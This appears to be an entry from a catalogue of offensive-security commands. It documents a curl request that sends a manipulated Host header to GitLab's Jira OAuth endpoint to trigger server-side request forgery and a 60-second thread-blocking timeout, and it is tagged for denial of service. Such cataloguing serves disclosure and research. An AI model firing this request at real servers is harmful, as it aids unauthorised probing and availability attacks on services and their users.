---
id: cmd-uuid-002
data: 'curl -X POST -H ''Host: 162.243.147.21:81'''
tags:
  - ssrf
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.399Z'
verified: false
validated: true
submitted: true
---
# curl-demonstrate-ssrf-timeout

## Command

```bash
curl -X POST -H 'Host: 162.243.147.21:81'
```

## Description

Incomplete snippet to illustrate the timing impact of SSRF exploitation in GitLab, showing the 60-second TCP read timeout that blocks threads and affects availability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H 'Host: 162.243.147.21:81'` | Sets Host header to trigger timeout on non-responsive internal target | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

### Advanced Usage

Not applicable; used for timing measurement.

## Expected Output

Command runtime: 0.03s user 0.01s system 0% cpu 1:00.76 total, demonstrating the 60-second blocking timeout during SSRF attempt.

## Related

- [[Related Procedure|procedures/Trigger-SSRF-with-Manipulated-Host-Header]]
